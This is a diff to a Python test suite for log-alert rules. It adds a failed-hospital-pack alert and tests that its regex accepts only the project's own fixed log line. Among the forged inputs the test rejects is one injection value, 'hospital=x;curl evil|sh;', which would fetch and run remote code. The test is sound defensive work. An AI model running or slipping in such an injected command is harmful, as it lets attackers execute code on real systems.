@@ -39,6 +39,8 @@ FB = load(LOGS / "fluent-bit" / "fluent-bit.yaml")
 FILTERS = load(LOGS / "fluent-bit" / "filters.yaml")
 LUA = (LOGS / "fluent-bit" / "redact.lua").read_text()
 ALERTS = {f.name: load(f) for f in sorted((LOGS / "alerts").glob("*.yml"))}
+# The reference pack alert's whole-line pattern (deploy/logs/alerts/packs.yml, S1)
+PACKS_LINE = r"^ihr-packs: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=failed$"
 STAGING_SH = (ROOT / "scripts" / "staging.sh").read_text()
 DEPLOY_SH = (ROOT / "scripts" / "deploy.sh").read_text()
 LONG_RUNNING = ("victorialogs", "fluent-bit", "vmalert")
@@ -243,26 +245,57 @@ class LogAlerts(unittest.TestCase):
                     yield fname, r
 
     def test_labels_and_text(self):
-        """The address is named on purpose (owner, Q-O8), and only the checked client_ip field."""
+        """The address is named on purpose (owner, Q-O8), and only the checked client_ip field.
+        The reference pack alert (P1-T15a) names only the hospital, read from our own fixed line."""
         names = []
         for fname, r in self.rules():
             names.append(r["alert"])
             self.assertIn(r["labels"]["severity"], {"critical", "warning"}, r["alert"])
             by = re.findall(r"stats by \(([^)]*)\)", r["expr"])
-            self.assertLessEqual(set(by), {"client_ip"}, r["alert"])
-            # container lines only: journald's own fields say Docker wrote them (redact.lua)
-            self.assertRegex(r["expr"], r"^_time:\d+m source:=container service:=(keycloak|traefik) ", r["alert"])
+            if fname == "packs.yml":
+                self.assertEqual(by, ["hospital"], r["alert"])
+                # container lines (redact.lua) of the services that run --startup only (never the
+                # web backend, which logs request paths), and our whole fixed line (S1)
+                self.assertRegex(r["expr"], r"^_time:\d+h source:=container service:in\(migrate, celery\) "
+                                 r'"ihr-packs: hospital=" \| extract_regexp "' + re.escape(PACKS_LINE) + r'" '
+                                 r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ', r["alert"])
+                allowed = r"^\$(labels\.hospital|value)$"
+                # the mailed command never carries text from the log line
+                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
+            else:
+                self.assertLessEqual(set(by), {"client_ip"}, r["alert"])
+                # container lines only: journald's own fields say Docker wrote them (redact.lua)
+                self.assertRegex(r["expr"], r"^_time:\d+m source:=container service:=(keycloak|traefik) ", r["alert"])
+                allowed = r"^\$(labels\.client_ip|value)$"
             for ref in re.findall(r"\{\{(.*?)\}\}", r["annotations"]["summary"]):
-                self.assertRegex(ref.strip(), r"^\$(labels\.client_ip|value)$", r["alert"])
-        self.assertEqual(sorted(names), ["FailedSignInsFromAddress", "RateLimitedAddress",
+                self.assertRegex(ref.strip(), allowed, r["alert"])
+        self.assertEqual(sorted(names), ["FailedSignInsFromAddress", "PackApplyFailed", "RateLimitedAddress",
                                          "SignInLockoutStorm", "SignInLockoutsFromAddress"])
+
+    def test_pack_line_is_ours_alone(self):
+        """S1: the rule's regex takes only our own whole line with a slug-shaped hospital; text
+        anyone can put in a request path or a longer line is never a hospital."""
+        [expr] = [r["expr"] for f, r in self.rules() if f == "packs.yml"]
+        self.assertIn('extract_regexp "%s"' % PACKS_LINE, expr)
+        line = re.compile(PACKS_LINE)
+        self.assertEqual(line.match("ihr-packs: hospital=alpha outcome=failed")["hospital"], "alpha")
+        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-packs: hospital=fake outcome=failed" 404 179',
+                       "Not Found: /api/ihr-packs: hospital=fake outcome=failed",
+                       "ihr-packs: hospital=x;curl evil|sh; outcome=failed",
+                       "ihr-packs: hospital=fake outcome=failed (and more)",
+                       "ihr-packs: hospital=Fake outcome=failed",
+                       "ihr-packs: hospital=ab outcome=failed",
+                       "ihr-packs: hospital=beta outcome=deferred",
+                       "ihr-packs: hospital=fake outcome=failed\nmore"):
+            self.assertIsNone(line.search(forged), forged)
 
     def test_holds_and_routing(self):
         """The hold before mailing is part of each alert's meaning (README table); the per-address
         alerts are mailed at any hour (owner, Q-O9)."""
         holds = {r["alert"]: r.get("for") for _, r in self.rules()}
         self.assertEqual(holds, {"SignInLockoutsFromAddress": None, "SignInLockoutStorm": None,
-                                 "FailedSignInsFromAddress": None, "RateLimitedAddress": "5m"})
+                                 "FailedSignInsFromAddress": None, "RateLimitedAddress": "5m",
+                                 "PackApplyFailed": None})
         anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
         self.assertEqual(anytime, ["FailedSignInsFromAddress", "RateLimitedAddress", "SignInLockoutsFromAddress"])
         cfg = func("monitoring_config")
